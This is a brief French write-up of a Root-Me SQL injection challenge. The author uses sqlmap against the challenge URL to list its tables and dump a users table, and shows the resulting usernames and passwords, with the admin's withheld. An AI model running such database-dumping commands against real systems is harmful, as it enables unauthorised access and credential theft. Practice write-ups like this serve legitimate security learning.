Pour ce challenge, j’ai utilisé sqlmap, j’ai commencé par récupérer les tables :
```
sqlmap -u "http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1" --tables
```
```
<current>
[2 tables]
+-------+
| news  |
| users |
+-------+
```

puis j’ai récupéré les utilisateurs de la table users :
```
sqlmap -u "http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1" -T users --dump
```
```
Database: <current>
Table: users
[3 entries]
+------+-----------------+----------+
| Year | password        | username |
+------+-----------------+----------+
| 2006 | vUrpgAsCTX      | user1    |
| 2005 | censuré         | admin    |
| 2008 | aFjRKx7j9d      | user2    |
+------+-----------------+----------+
```

pour valider ce challenge, il suffit d’utiliser le mot de passe de l’admin et le tour est joué ;)
